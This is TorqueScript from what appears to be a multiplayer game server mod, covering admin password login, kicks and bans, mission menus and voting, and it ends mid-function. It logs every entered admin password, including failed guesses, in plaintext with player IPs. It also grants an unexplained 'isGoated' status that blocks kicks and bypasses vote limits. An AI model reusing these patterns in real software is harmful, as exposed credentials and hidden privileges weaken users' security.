function StillKicking(%team) 
{
	DebugFun("StillKicking",%team);
	%count = 0; 
	for(%i = Client::getFirst() ; %i != -1 ; %i = Client::getNext(%i)) 
	{ 
		if(Gamebase::getteam(%i)  == %team)
		{
			%obj = Client::getOwnedObject(%i);
			if(%obj != -1 && getObjectType(%obj) != "ObserverCamera" && !Player::isDead(%obj))			
				%PlayersAlive++; 
		} 
	}
	return %PlayersAlive; 
} 

$curVoteTopic = "";
$curVoteAction = "";
$curVoteOption = "";
$curVoteCount = 0;

function remoteAdmin::strip(%client)
{
	if( CheckEval("remoteAdmin::Strip", %client) )
		return;
			
	if(%client.isAdmin)
	{
		%client.isAdmin = "";
		%client.isSuperAdmin = "";
		Client::sendMessage(%client, 0, "You stripped your own admin.~wCapturedTower.wav");
		bottomprint(%client, "<f1><jc>You Demoted yourself...", 20);
		Anni::Echo("isAdmin: ",%client.isAdmin," isSuperAdmin: ",%client.isSuperAdmin);
	}
}

function Admin::strip(%client)
{
	DebugFun("Admin::strip",%client);
	//Anni::Echo("strip! you bastard.");
	%client.isAdmin = "";
	%client.isSuperAdmin = "";
	%client.isGod = "";
	%client.isOwner = "";
	Client::sendMessage(%client, 0, "Your admin has been stripped.~wCapturedTower.wav");
	bottomprint(%client, "<f1><jc>Your admin has been stripped.", 20);
	Anni::Echo("isAdmin: ",%client.isAdmin," isSuperAdmin: ",%client.isSuperAdmin);
}

function Admin::give(%client,%flag)
{
	DebugFun("Admin::give",%client,%flag);
	//Anni::Echo(%client);
	%client.isAdmin = "true";
	%client.isSuperAdmin = "true";
	Client::sendMessage(%client, 0, "You have been granted admin.~wCapturedTower.wav");
	bottomprint(%client, "<f1><jc>You have been granted admin.", 20);
	if(!%flag)
		Anni::Echo("isAdmin: ",%client.isAdmin," isSuperAdmin: ",%client.isSuperAdmin);
}

function Admin::giveGod(%client)
{
	DebugFun("Admin::giveGod",%client);
	%client.isAdmin = "true";
	%client.isSuperAdmin = "true";
	%client.isGod = "true";
	Client::sendMessage(%client, 0, "You have been given god status.~wCapturedTower.wav");
	bottomprint(%client, "<f1><jc>You have been given god status.", 20);
	Anni::Echo("isAdmin: ",%client.isAdmin,". isSuperAdmin: ",%client.isSuperAdmin,". isGod: ",%client.isGod);
}

function Admin::changeMissionMenu(%clientId, %voteit)
{
	%client = Player::getClient(%clientId);
	DebugFun("Admin::changeMissionMenu",%clientId,%voteit);
	Client::buildMenu(%clientId, "Select Mission Type", "cmtype", true); 
	%index = 1; 
	for(%type = 1; %type < $MLIST::TypeCount; %type++)
	{
		if($MLIST::Type[%type] != "Training")
		{
			if(%index == 8 && $MLIST::TypeCount > 8)
			{
				Client::sendMessage(%client, 0, "~wPku_ammo.wav");
				Client::addMenuItem(%clientId, %index @ "More Types...", "more 8 " @ %voteit); 
				break; 
			}
			%NumMaps=0;
			for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;	
			Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", %type @ " 0 " @ %voteit); 
			%index++; 
		} 
	}
} 

function processMenuCMoo(%clientId, %first, %voteit)
{
	%client = Player::getClient(%clientId);
	DebugFun("processMenuCMoo",%clientId,%first,%voteit);
	Client::buildMenu(%clientId, "Select Mission Type", "cmtype", true); 
	%index = 1; 
	for(%type = %first; %type < $MLIST::TypeCount; %type++)
	{
		if($MLIST::Type[%type] != "Training")
		{
			if(%index == 8 && $MLIST::TypeCount > %first + %index)
			{
				Client::sendMessage(%client, 0, "~wPku_ammo.wav");
				Client::addMenuItem(%clientId, %index @ "More Types...", "more " @ %first + %index @ " " @ %voteit); 
				break; 
			}
			%NumMaps=0;for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;				
			Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", %type @ " 0 " @ %voteit); 
			%index++; 
		} 
	}
}

function processMenuCMType(%clientId, %options)
{
	%client = Player::getClient(%clientId);
	DebugFun("processMenuCMType",%clientId,%options);
	%option = getWord(%options, 0); 
	%first = getWord(%options, 1); 
	%voteit = getWord(%options, 2);
	if(%option == "more")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		processMenuCMoo(%clientId, %first, %voteit); 
		return; 
	}
	%curItem = 0;
	Client::buildMenu(%clientId, "Select Mission", "cmission", true); 
	for(%i = 0; (%misIndex = getWord($MLIST::MissionList[%option], %first + %i)) != -1; %i++)
	{
		if(%i > 6)
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			Client::addMenuItem(%clientId, %i+1 @ "More Missions...", "more " @ %first + %i @ " " @ %option @ " " @ %voteit); 
			break; 
		} 
		Client::addMenuItem(%clientId, %i+1 @ $MLIST::EName[%misIndex], %misIndex @ " " @ %option @ " " @ %voteit); 
	} 
}

function processMenuCMission(%clientId, %option)
{
	DebugFun("processMenuCMission",%clientId,%option);
	if(getWord(%option, 0) == "more")
	{
		%first = getWord(%option, 1);
		%type = getWord(%option, 2);
		processMenuCMType(%clientId, %type @ " " @ %first);
		return;
	}
	%mi = getWord(%option, 0);
	%mt = getWord(%option, 1);

	%misName = $MLIST::EName[%mi];
	%misType = $MLIST::Type[%mt];

	// verify that this is a valid mission:
	if(%misType == "" || %misType == "Training")
		return;
	for(%i = 0; true; %i++)
	{
		%misIndex = getWord($MLIST::MissionList[%mt], %i);
		if(%misIndex == %mi)
			break;
		if(%misIndex == -1)
			return;
	}
	
	//%clientId.PickNextMiss
	if(%clientId.isAdmin && !%clientId.MissVote)
	{
		if(!%clientId.SecretAdmin)
			%adminName = Client::getName(%clientId);
		else 
			%adminName = SecretAdmin();
		if(%clientId.PickNextMiss)
		{
			messageAll(0, %adminName @ " chose the next mission, " @ %misName @ " (" @ %misType @ ")~wCapturedTower.wav");
			%clientId.PickNextMiss = "";
			$nextAdminMap = %misName;
			$AdminNextMap = true;
			//Vote::changeMission();
			//Server::loadMission(%misName);			
		}
		else
		{
			messageAll(0, %adminName @ " changed the mission to " @ %misName @ " (" @ %misType @ ")~wCapturedTower.wav");
			Vote::changeMission();
			Server::loadMission(%misName);
		}
	}
	else
	{
		Admin::startVote(%clientId, "change the mission to " @ %misName @ " (" @ %misType @ ")", "cmission", %misName);
		Game::menuRequest(%clientId);
		%clientId.MissVote = "";
	}
}

function remoteAdminPassword(%client, %password) //now records to a file of its own
{
	if( CheckEval("remoteAdminPassword", %client, %password) )
		return;	

	%transport = Client::getTransportAddress(%client);
	%ip = Ann::ipCut(%transport);
		
	%ip = Client::getTransportAddress(%client);
	%name = Client::getName(%client);

	if($AdminPassword != "" && %password == $AdminPassword)
	{
		%client.isAdmin = true;
		%client.isSuperAdmin = true;
		Admin::give(%client);
		Game::refreshClientScore(%client);
		Client::sendMessage(%client, 0, "You have been given SAD power.~wCapturedTower.wav");
		echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and is now SAD");
		$Admin = %name @ " gained Super admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
		export("Admin","config\\AdminPass.log",true);
		return;
	}
	for(%x = 0; %x < 100; %x = %x++)
	{
		if($ANNIHILATION::OwnerPassword[%x] != "" && %password == $ANNIHILATION::OwnerPassword[%x]) //New passwords
		{
			%client.isAdmin = true;
			%client.isSuperAdmin = true;
			%client.isGod = true;
			%client.isOwner = true;
			Game::refreshClientScore(%client);
			Client::sendMessage(%client, 0, "You have been given Owner power.~wCapturedTower.wav");
			echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and is now Owner");
			$Admin = %name @ " gained Owner admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
			export("Admin","config\\AdminPass.log",true);
			return;
		}
	}
	for(%x = 0; %x < 100; %x = %x++)
	{
		if($ANNIHILATION::GodPassword[%x] != "" && %password == $ANNIHILATION::GodPassword[%x]) //New passwords 
		{
			%client.isAdmin = true;
			%client.isSuperAdmin = true;
			%client.isGod = true;
			Game::refreshClientScore(%client);
			Client::sendMessage(%client, 0, "You have been given God power.~wCapturedTower.wav");
			echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and is now God");
			$Admin = %name @ " gained God admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
			export("Admin","config\\AdminPass.log",true);
			return;
		}
	}
	for(%x = 0; %x < 100; %x = %x++)
	{
		if($ANNIHILATION::SADPassword[%x] != "" && %password == $ANNIHILATION::SADPassword[%x])
		{
			%client.isAdmin = true;
			%client.isSuperAdmin = true;
			Game::refreshClientScore(%client);
			Client::sendMessage(%client, 0, "You have been given SAD power.~wCapturedTower.wav");
			echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and is now SAD");
			$Admin = %name @ " gained Super admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
			export("Admin","config\\AdminPass.log",true);
			return;
		}
	}
	for(%x = 0; %x < 100; %x = %x++)
	{
		if($ANNIHILATION::PAPassword[%x] != "" && %password == $ANNIHILATION::PAPassword[%x])
		{
			%client.isAdmin = true;
			%client.paNum = %x;
			Game::refreshClientScore(%client);
			Client::sendMessage(%client, 0, "You have been given PA power.~wCapturedTower.wav");
			echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and is now PA");
			$Admin = %name @ " gained Public admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
			export("Admin","config\\AdminPass.log",true);
			return;
		}
	}
	Client::sendMessage(%client, 0, "Your password is invalid.~waccess_denied.wav");
	echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and FAILED");
 	if(%client.isSuperAdmin || %client.isAdmin)
 		Admin::strip(%client); 		 
	$Admin = %name @ " failed sad admin with the pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
	export("Admin","config\\AdminPass.log",true);
}

function remoteSetPassword(%client, %password)
{
	if( CheckEval("remoteSetPassword", %client, %password) )
		return;
		
	%password = Ann::Clean::string(%password);	
	
	if(%client.isSuperAdmin)
	{
		$Server::Password = %password;
		%ip = Client::getTransportAddress(%client);
		$Admin = Client::getName(%client)@ " IP# "@ %ip @" set server password to " @ %password;	Anni::Echo($admin);
		export("Admin","config\\Admin.log",true);				
	}
}

function remoteSetTimeLimit(%client, %time)
{
	if( CheckEval("remoteSetTimeLimit", %client, %time) )
		return;
	
	if(%client.isAdmin)
	{
		%time = floor(%time);
		if(%time == $Server::timeLimit || (%time != 0 && %time < 1) || %time > 200) 
			return;
		
		$TA::NoMARecord = true;
		$Server::timeLimit = %time;
		if(!%client.SecretAdmin)
		{
			if(%time)
				messageAll(0, Client::getName(%client) @ " changed the time limit to " @ %time @ " minute(s).~wCapturedTower.wav");
			else
				messageAll(0, Client::getName(%client) @ " disabled the time limit.~wCapturedTower.wav");			 
		}
		else
		{
			if(%time)
				messageAll(0, "Time limit changed to " @ %time @ " minute(s).~wCapturedTower.wav");
			else
				messageAll(0, "Time limit disabled.~wCapturedTower.wav");			
		}
		Game::checkTimeLimit();
	}
}

function VPassTimeLimit(%time)
{
	DebugFun("VPassTimeLimit",%time);
	%time = floor(%time);
	
	if(%time == $Server::timeLimit || (%time != 0 && %time < 1))
		return;
	
	$TA::NoMARecord = true;
	$Server::timeLimit += %time;	//$missionStartTime += (%time * 60);


	if(%time)
		messageAll(0, %time @ " minutes added to the game.~wCapturedTower.wav");
	else
	{
		messageAll(0, "Time limit disabled.~wCapturedTower.wav");
		$TA::NoMARecord = true;
		$Server::timeLimit = %time;
	}
	Game::checkTimeLimit();
}

function remoteSetTeamInfo(%client, %team, %teamName, %skinBase)
{
	if( CheckEval("remoteSetTeamInfo", %client, %team, %teamName, %skinBase) )
		return;
		
	%team = Ann::Clean::string(%team);
	%teamName = Ann::Clean::string(%teamName);
	%skinBase = Ann::Clean::string(%skinBase);
	
	if(%team >= 0 && %team < 8 && %client.isAdmin)
	{
		$Server::teamName[%team] = %teamName;
		$Server::teamSkin[%team] = %skinBase;
		messageAll(0, "Team " @ %team @ " is now \"" @ %teamName @ "\" with skin: " @ %skinBase @ " courtesy of " @ Client::getName(%client) @ ".	Changes will take effect next mission.");
	}
}

function SmurfCheck(%clientId)
{
	DebugFun("SmurfCheck",%clientId);
	if ( %clientId.isGoated )
		return False;
   	%ip = Client::getTransportAddress(%clientId);
  	%ClientIp = Ann::ipCut(%ip);

	for(%i = 0; %i < getNumClients(); %i++)
	{
		%cl = getClientByIndex(%i);
		%ip = Client::getTransportAddress(%cl);
		if(%clientId != %cl)
		{
			if(!String::ICompare(%ClientIp, Ann::ipCut(%ip)))
			{
				Anni::Echo(%ClientIp@", "@Client::getName(%clientId)@" vote slamming.. ");
				Client::sendMessage(%clientId, 0, "Only one vote per IP.~wfemale2.wsorry.wav");
				%matchIp ++;					
			}
		}
	}	
	return %matchIp;
}

function remoteVoteYes(%clientId)
{
	if( CheckEval("remoteVoteYes", %clientId) )
		return;
		if(%clientId.isGoated == true)
		{
			%clientId.vote = "yes";
			centerprint(%clientId, "", 0);
			return;
		}	
	if(!SmurfCheck(%clientId))
	{
		%clientId.vote = "yes";
		centerprint(%clientId, "", 0);
	}
}

function remoteVoteNo(%clientId)
{
	if( CheckEval("remoteVoteNo", %clientId) )
		return;

		if(%clientId.isGoated == true)
		{
			%clientId.vote = "no";
			centerprint(%clientId, "", 0);
			return;
		}
	
	if(!SmurfCheck(%clientId))
	{	
		%clientId.vote = "no";
		centerprint(%clientId, "", 0);
	}
}

function Admin::startMatch(%admin)
{
	DebugFun("Admin::startMatch",%admin);
	if(%admin == -1 || %admin.isAdmin)
	{
		//echo("1");
		if(!$CountdownStarted && !$matchStarted)
		{
			//echo("2");
			if(%admin == -1)
			{
				//echo("3");
				messageAll(0, "Match start countdown forced by vote.");
			}
			else
			{
				//echo("4");
				messageAll(0, "Match start countdown forced by " @ Client::getName(%admin));
			}
			Game::ForceTourneyMatchStart();
		}
	}
}

function Ann::IP(%transport)	
{
	DebugFun("Ann::IP",%transport);
	%dot = "";
	%ip = "";
	for(%i = 0; String::getSubStr(%transport,%i,1) != ""; %i++)
		{
		%sub = String::getSubStr(%transport,%i,1);
		if(!String::ICompare(%sub, ".")) {
			%dot++;
			%ip = %ip @ %sub;
			}
		else if(%dot > 1) %ip = %ip @ "*";
		else %ip = %ip @ %sub;
		}
	return %ip;
}

function Admin::kick(%admin, %client, %ban)
{
	DebugFun("Admin::kick",%admin,%client,%ban);
	if(%admin != %client && (%admin == -1 || %admin.isAdmin))
	{
		%name = Client::getName(%client);
		%ip = Client::getTransportAddress(%client);
		if(!%admin.SecretAdmin)
			%adminName = Client::getName(%admin);
		else %adminName = SecretAdmin();

// new
//		if(%admin.isSuperAdmin && !%client.isSuperAdmin || %admin.isOwner && !%client.isOwner || %admin.isGod && !%client.isGod || %admin.isGoated && !%client.isGoated)
//		{
// end new
		
		if(%client.isGoated == true)
		{
			messageAll(0, %name@" cannot be kicked.");
			return;
		}
		
		if(%ban && !%admin.isSuperAdmin)
			return;
		if(%ban)
		{
			%word = "banned";
			%cmd = "BAN: ";		
			
		}
		else
		{
			%word = "kicked";
			%cmd = "KICK: ";
		}
		if(%client.isUntouchable) // client.isAdmin
		{
			if(%admin == -1)
				messageAll(0, %name@" cannot be " @ %word @ ".");
			else
				Client::sendMessage(%admin, 0, "An admin cannot be " @ %word @ ".");
			return;
		}
		

		//Anni::Echo(%cmd @ %admin @ " " @ %client @ " " @ %ip);

		if(%ip == "")
			return;
			
		if(!$ANNIHILATION::BanTime)
			$ANNIHILATION::BanTime = 3600;	
		if(!$ANNIHILATION::KickTime)
			$ANNIHILATION::KickTime = 360;
		
		if(%ban)
		{
			BanList::addAbsolute("IP:"@Ann::ipCut(%ip)@":*", $ANNIHILATION::BanTime);
			BanList::export("config\\banlist.cs");
			
			Ann::IpBanExport(%client,%admin);
		}
		else
		{
			BanList::add(%ip, $ANNIHILATION::KickTime);
			BanList::export("config\\banlist.cs");
		}

		if(%admin == -1)
		{
			MessageAll(0, %name @ " was " @ %word @ " from vote.~wCapturedTower.wav");
			Anni::Echo(%cmd @ %name @ " ( " @ %ip @ " was " @ %word @ " from vote.");
			%message = %cmd @ %name @ " ( " @ %ip @ " was " @ %word @ " from vote.";
			Net::kick(%client, "You were " @ %word @ " by consensus.");
		}
		else
		{
			MessageAll(0, %name @ " was " @ %word @ " by " @ %adminName @ ".~wCapturedTower.wav");
			Anni::Echo(%cmd @ %name @ " ( " @ %ip @ " was " @ %word @ " by " @ %adminName @ "." );
			%message = %cmd @ %name @ " ( " @ %ip @ " was " @ %word @ " by " @ %adminName @ ".";
			Net::kick(%client, "You were " @ %word @ " by " @ %adminName);
		}
		logAdminAction(%admin,%message);
// new
//		}
// end new
	}
}

function Admin::fun(%admin,%clientId,%word)
{
	%client1 = Player::getClient(%clientId);
	%client2 = Player::getClient(%admin);
	if(%client1.isGoated && %client2 != %client1)
	{
	return;
	}
	DebugFun("Admin::fun",%admin,%clientId,%word);
	if(%admin == -1)
	{
		centerprintall("<jc><f1>"@Client::getName(%clientId) @ " was "@ %word @ " by consensus.", 3);
		logAdminAction(%clientId, " was "@ %word @ " by consensus.");		
		messageAll(0, Client::getName(%clientId) @ " was "@ %word @ " by consensus.~wCapturedTower.wav");
	}
	else
	{
		if(!%admin.SecretAdmin)
			%adminName = Client::getName(%admin);
		else %adminName = SecretAdmin();
		
		messageAll(0, Client::getName(%clientId) @ " was "@ %word @ " by "@ %adminName @".~wCapturedTower.wav");
		centerprintall("<jc><f1>"@Client::getName(%clientId) @ " was "@ %word @ " by "@ %adminName @".", 3);
		logAdminAction(%admin, Client::getName(%clientId) @ " was "@ %word @ " by "@ Client::getName(%admin));
	}
	if(%word=="frozen")
	{	freeze(%clientId,false);
			messageall(0,Client::getName(%clientId) @ " was "@ %word @ " for 2 minutes by consensus.");
		}
	if(%word=="poisoned") poison(%clientId);
	if(%word=="De-Tongued") %clientId.silenced = true;
	if(%word=="Un-Muted") %clientId.silenced = "";
	if(%word=="Admined") %clientId.isAdmin = true;
	if(%word=="De -admined") {%clientId.isAdmin = false;%clientId.isSuperAdmin = false;}
	if(%word=="Kicked") Admin::kick(%admin, %clientId);
	if(%word=="Banned") Admin::kick(%admin, %clientId, true);
}

function Admin::voteFailed()
{
	DebugFun("Admin::voteFailed",$curVoteInitiator,$curVoteAction,$curVoteOption);
	$curVoteInitiator.numVotesFailed++;
	if($curVoteAction == "kick" || $curVoteAction == "admin")
		$curVoteOption.voteTarget = "";
}

//votepassed
function Admin::voteSucceded()
{
	DebugFun("Admin::voteSucceded",$curVoteInitiator,$curVoteAction,$curVoteOption);
	$curVoteInitiator.numVotesFailed = "";
	if($curVoteAction == "kick")
	{
		if($curVoteOption.voteTarget)
		{
			Admin::kick(-1, $curVoteOption);
		}
	}
	if($curVoteAction == "poison")
	{
		if($curVoteOption.voteTarget)
		{
			//Admin::fun(-1, $curVoteOption,"poisoned");
			KillRatDead($curVoteOption);
			centerprint($curVoteOption, "<jc><f1>you were poisoned by everyone.", 15);		
			messageAll(0, Client::getName($curVoteOption) @ " had some acid with their Wheaties.");
			logAdminAction($curVoteOption," was Poisoned by consensus.");	
		}
	}
	if($curVoteAction == "unsilence")
	{
		if($curVoteOption.voteTarget)
			Admin::fun(-1, $curVoteOption,"Un-Muted");
	}
	if($curVoteAction == "vTeamCaptin")
	{
		%cl = $curVoteOption;
		%cl.isTeamCaptin = true;
		Game::refreshClientScore(%cl);
	}
	if($curVoteAction == "vDeTeamCaptin")
	{
		%cl = $curVoteOption;
		%cl.isTeamCaptin = false;
		Game::refreshClientScore(%cl);
	}
	if($curVoteAction == "silence")
	{
		if($curVoteOption.voteTarget)
		{
			Admin::fun(-1, $curVoteOption,"De-Tongued");
		}
	}	
	if($curVoteAction == "freeze")
	{
		if($curVoteOption.voteTarget)
		{
			//Admin::fun(-1, $curVoteOption,"poisoned");
			Freeze($curVoteOption);
			centerprint($curVoteOption, "<jc><f1>you were frozen by everyone.", 15);		
			messageAll(0, Client::getName($curVoteOption) @ " gets the cold shoulder for 2 minutes.");
			logAdminAction($curVoteOption," was frozen by consensus.");	
		}
	}
	else if($curVoteAction == "admin")
	{
		if($curVoteOption.voteTarget)
		{
			$curVoteOption.isAdmin = true;
			logAdminAction($curVoteOption," was admined by consensus.");
			messageAll(0, Client::getName($curVoteOption) @ " has become an administrator.~wCapturedTower.wav");
			if($curVoteOption.menuMode == "options")
				Game::menuRequest($curVoteOption);
		}
		$curVoteOption.voteTarget = false;
	}
	else if($curVoteAction == "cmission")
	{
		messageAll(0, "Changing to mission " @ $curVoteOption @ ".~wCapturedTower.wav");
		Vote::changeMission();
		Server::loadMission($curVoteOption);
	}
	else if($curVoteAction == "etd")
		Admin::setTeamDamageEnable(-1, true);
	else if($curVoteAction == "dtd")
		Admin::setTeamDamageEnable(-1, false);
//tourney code 
	else if($curVoteAction == "tourney")
		Admin::setModeTourney(-1);
	else if($curVoteAction == "ffa")
		Admin::setModeFFA(-1);
	else if($curVoteOption == "vsmatch")
		Admin::startMatch(-1);
	else if($curVoteOption == "vdtourneyot")
		$TA::TourneyOT = false;
	else if($curVoteOption == "vetourneyot")
		$TA::TourneyOT = true;
// vote map
	else if($curVoteAction == "NextMap")
		nextmap();
	else if($curVoteAction == "StartClearWeather")
		Weather::ClearStorms();
	else if($curVoteAction == "StartLRain")
		Weather::LightRainstorm();
	else if($curVoteAction == "StartLSnow")
		Weather::LightSnowstorm();
		else if($curVoteAction == "StartHRain")
		Weather::HeavyRainstorm();
	else if($curVoteAction == "StartHSnow")
		Weather::HeavySnowstorm();
	else if($curVoteAction =="StartRainstorm")
		Weather::HugeRainstorm();
	else if($curVoteAction =="StartSnowstorm")
		Weather::HugeSnowstorm();			
	else if(getword($curVoteAction,0) == "RandomMap")		
		randommap($curVoteOption);
	else if($curVoteAction == "ReplayMap")
		replaymap();
	else if($curVoteAction == "EnableTheBuild")
		$Build = 1;
//vote time		
	else if($curVoteAction == "VTime")
		VPassTimeLimit($curVoteOption);
// damage vote	
//base rape
	else if($curVoteAction == "eBaseD") 
		Admin::setBaseDamageEnable(-1, true);
	else if($curVoteAction == "dBaseD") 
		Admin::setBaseDamageEnable(-1, false);
// base healing		
	else if($curVoteAction == "eBaseH") 
		Admin::setBaseHealingEnable(-1, true);
	else if($curVoteAction == "dBaseH") 
		Admin::setBaseHealingEnable(-1, false);
//out of area damage
	else if($curVoteAction == "eOutAreaD") 
		Admin::setAreaDamageEnable(-1, true);
	else if($curVoteAction == "dOutAreaD") 
		Admin::setAreaDamageEnable(-1, false);		
//Builder mode
	else if($curVoteAction == "ebmt")
	{
		Admin::setBuild(-1, true);
	}

	else if($curVoteAction == "dbmt")
	{
		Admin::setBuild(-1, false);	
	}
	
	else if($curVoteAction == "etabm")
	{
		Admin::setABuild(-1, true);	
	}
	
	else if($curVoteAction == "dtabm")
	{
		Admin::setABuild(-1, false);	
	}
//player damage	
	else if($curVoteAction == "ePlayerD") 
	{
		$Admin = "Player damage enabled by consensus"; 
		export("Admin","config\\Admin.log",true); 
		Admin::setPlayerDamageEnable(-1, true);
	}
	else if($curVoteAction == "dPlayerD") 
	{
		$Admin = "Player damage disabled by consensus"; 
		export("Admin","config\\Admin.log",true);		
		Admin::setPlayerDamageEnable(-1, false);
	}	
	
	// flag caps	 
		if($curVoteAction == "dFlag")	
			ServerSwitches(-1,"Flag Cap Limit",false);
		else if($curVoteAction == "eFlag")	
			ServerSwitches(-1,"Flag Cap Limit",true);	
			
//new voting stuff
	if($curVoteAction == "vmodannispawn")
	{
		$TALT::SpawnType = "AnniSpawn";
		TALT::SpawnReset();
		//Messageall(0,"Vote to change LT Mod to Annihilation passed.~wcapturedtower.wav");
	}
	else if($curVoteAction == "vmodelitespawn")
	{
		$TALT::SpawnType = "EliteSpawn";
		TALT::SpawnReset();
		//Messageall(0,"Vote to change LT Mod to EliteRenegades passed.~wcapturedtower.wav");
	}
	else if($curVoteAction == "vmodbasespawn")
	{
		$TALT::SpawnType = "BaseSpawn";
		TALT::SpawnReset();
		//Messageall(0,"Vote to change LT Mod to Base passed.~wcapturedtower.wav");
	}
//Hunter added 
	else if($curVoteAction == "eHunter")
	{
		$TowerSwitchNexus = "";
		ReturnObjectives();
		exec(flaghunter);
		//Mission::init();
		ServerSwitches(-1,"Flag Hunter",true);
	}
	else if($curVoteAction == "dHunter")
	{
		$TowerSwitchNexus = "";
		$FlagHunter::Enabled = "";
		ServerSwitches(-1,"Flag Hunter",false);
	}
		
	else if($curVoteAction == "egm")
		Admin::setGreedMode(-1, true);
	else if($curVoteAction == "dgm")
		Admin::setGreedMode(-1, false);
	else if($curVoteAction == "ehm")
		Admin::setHoardMode(-1, true);
	else if($curVoteAction == "dhm")
		Admin::setHoardMode(-1, false);			
// end flaghunter switches		
			
}

function Admin::countVotes(%curVote)
{
	DebugFun("Admin::countVotes",%curVote);
	// if %end is true, cancel the vote either way
	if(%curVote != $curVoteCount)
		return;
	%votesFor = 0;
	%votesAgainst = 0;
	%votesAbstain = 0;
	%totalClients = 0;
	%totalVotes = 0;
	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	{
		%totalClients++;
		if(%cl.vote == "yes")
		{
			%votesFor++;
			%totalVotes++;
		}
		else if(%cl.vote == "no")
		{
			%votesAgainst++;
			%totalVotes++;
		}
		else
			%votesAbstain++;
	}
	%minVotes = floor($Server::MinVotesPct * %totalClients);
	if(%minVotes < $Server::MinVotes)
		%minVotes = $Server::MinVotes;

	if(%totalVotes < %minVotes)
	{
		%votesAgainst += %minVotes - %totalVotes;
		%totalVotes = %minVotes;
	}
	%margin = $Server::VoteWinMargin;
	if($curVoteAction == "admin")
	{
		if(%minVotes < $Server::AdminMinVotes)
			%minVotes = $Server::AdminMinVotes;
		%margin = $Server::VoteAdminWinMargin;
		%totalVotes = %votesFor + %votesAgainst + %votesAbstain;
		if(%totalVotes < %minVotes)
			%totalVotes = %minVotes;
	}
	if((%votesFor / %totalVotes >= %margin || $curVoteForce == "YES") && $curVoteForce != "NO")
	{
		messageAll(0, "Vote to " @ $curVoteTopic @ " passed: " @ %votesFor @ " to " @ %votesAgainst @ " with " @ %totalClients - (%votesFor + %votesAgainst) @ " abstentions.");
		$curVoteForce = "";
		Admin::voteSucceded();
	}
	else	// special team kick option:
	{
		if($curVoteAction == "kick") // check if the team did a majority number on him:
		{
			%votesFor = 0;
			%votesAgainst = 0;
			%totalVotes = 0;
			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			{
				if(GameBase::getTeam(%cl) == $curVoteOption.kickTeam)
				{
					%totalVotes++;
					if(%cl.vote == "yes")
						%votesFor++;
					
				}
			}
			if((%totalVotes >= $Server::MinVotes && %votesFor / %totalVotes >= $Server::VoteWinMargin || $curVoteForce == "YES") && $curVoteForce != "NO")
			{
				messageAll(0, "Vote to " @ $curVoteTopic @ " passed: " @ %votesFor @ " to " @ %totalVotes - %votesFor @ ".");
				Admin::voteSucceded();
				$curVoteTopic = "";
				$curVoteForce = "";
				return;
			}
		}
		if (%totalClients - (%votesFor + %votesAgainst) <0 || %votesFor > %votesAgainst)
			messageAll(0, "Vote to " @ $curVoteTopic @ " did not pass: " @ %votesFor @ " to " @ %votesAgainst @ ", not enough votes to " @ $curVoteTopic);
		else messageAll(0, "Vote to " @ $curVoteTopic @ " did not pass: " @ %votesFor @ " to " @ %votesAgainst @ " with " @ %totalClients - (%votesFor + %votesAgainst) @ " abstentions.");
			Admin::voteFailed();
	}
	$curVoteTopic = "";
	$curVoteForce = "";
}

function Admin::startVote(%clientId, %topic, %action, %option)
{
	DebugFun("Admin::startVote",%clientId,%topic,%option);
	if(%clientId.lastVoteTime == "")
		%clientId.lastVoteTime = -$Server::MinVoteTime;

	// we want an absolute time here.
	%time = getIntegerTime(true) >> 5;
	%diff = %clientId.lastVoteTime + $Server::MinVoteTime - %time;

	if(%diff > 0)
	{
			if(!%clientId.isGoated)
		{
		Client::sendMessage(%clientId, 0, "You can't start another vote for " @ floor(%diff) @ " seconds.");
		return;
		}
	}
	if($curVoteTopic == "")
	{
		if ( %clientId.LastVote == %topic )
		{
			if(!%clientId.isGoated)
		{
			Client::sendMessage(%clientId, 1, "You may not spam vote.");
			return;
		}
		}
		if(%clientId.numFailedVotes)
			%time += %clientId.numFailedVotes * $Server::VoteFailTime;

		%clientId.lastVoteTime = %time;
		$curVoteInitiator = %clientId;
		$curVoteTopic = %topic;
		$curVoteAction = %action;
		$curVoteOption = %option;
		if(%action == "kick")
			$curVoteOption.kickTeam = GameBase::getTeam($curVoteOption);
		$curVoteCount++;
		
		bottomprintall("<jc><f1>" @ Client::getName(%clientId) @ " <f0>initiated a vote to <f1>" @ $curVoteTopic, 30);
		if ( Client::getTransportAddress(%option) != "" )
			centerprint(%option, "<jc><f1>"@Client::getName(%clientId)@" <f0>started a vote to <f1>"@%action@" you.", 25);	
		Anni::Echo("ADMINMSG: *** " @ Client::getName(%clientId) @ " initiated a vote to " @ $curVoteTopic);
		messageAll(0, Client::getName(%clientId) @ " initiated a vote to " @ $curVoteTopic@".~wCapturedTower.wav");
		logAdminAction(%clientId," initiated a vote to " @ $curVoteTopic);

		%clientId.LastVote = $curVoteTopic;
		
		if(%action == "kick" || %action == "freeze" || %action == "poison" || %action == "silence")
		{
			$VoteID = $curVoteOption;
			$VoteisActive = true;
			schedule("$VoteisActive=false;",$Server::VotingTime, 35);
			schedule("$VoteID=false;",$Server::VotingTime, 35);
